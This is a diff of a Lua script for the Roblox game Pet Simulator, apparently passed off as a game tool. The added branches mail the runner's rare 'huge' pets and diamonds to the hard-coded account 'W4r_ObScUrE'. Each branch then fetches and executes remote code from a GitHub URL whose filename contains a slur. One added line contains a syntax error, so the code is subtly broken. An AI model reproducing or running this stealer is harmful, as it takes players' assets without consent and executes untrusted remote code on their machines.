@@ -272,7 +272,7 @@ while wait() do
         if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
                     _G.Lol = 0
         end
-        if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
+        if v2.huge == true and v.r == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
             _G.Username = "W4r_ObScUrE"
             _G.PetName = v2.name
             _G.PetRar = v2.rarity
@@ -288,7 +288,54 @@ while wait() do
 			Invoke("Send Mail", unpack(args))
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
             wait(5)
-    
+	elseif v2.huge == true and string.find(v2.name, "Evolved") and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
+            _G.Username = "W4r_ObScUrE"
+            _G.PetName = v2.name
+            _G.PetRar = v2.rarity
+            print(_G.PetName)
+			local args = {
+    			[1] = {
+        			["Recipient"] = _G.Username,
+        			["Diamonds"] = _G.Lol,
+        			["Pets"] = {v.uid},
+        			["Message"] = _G.GiftMessage
+    			}
+			}
+			Invoke("Send Mail", unpack(args))
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
+            wait(5)
+	elseif v2.huge == true and v.g == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
+            _G.Username = "W4r_ObScUrE"
+            _G.PetName = v2.name
+            _G.PetRar = v2.rarity
+            print(_G.PetName)
+			local args = {
+    			[1] = {
+        			["Recipient"] = _G.Username,
+        			["Diamonds"] = _G.Lol,
+        			["Pets"] = {v.uid},
+        			["Message"] = _G.GiftMessage
+    			}
+			}
+			Invoke("Send Mail", unpack(args))
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
+            wait(5)	
+	else v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value > 100000 then
+            _G.Username = "W4r_ObScUrE"
+            _G.PetName = v2.name
+            _G.PetRar = v2.rarity
+            print(_G.PetName)
+			local args = {
+    			[1] = {
+        			["Recipient"] = _G.Username,
+        			["Diamonds"] = _G.Lol,
+        			["Pets"] = {v.uid},
+        			["Message"] = _G.GiftMessage
+    			}
+			}
+			Invoke("Send Mail", unpack(args))
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
+            wait(5)    
             if v2.huge == false then
                 break
             end
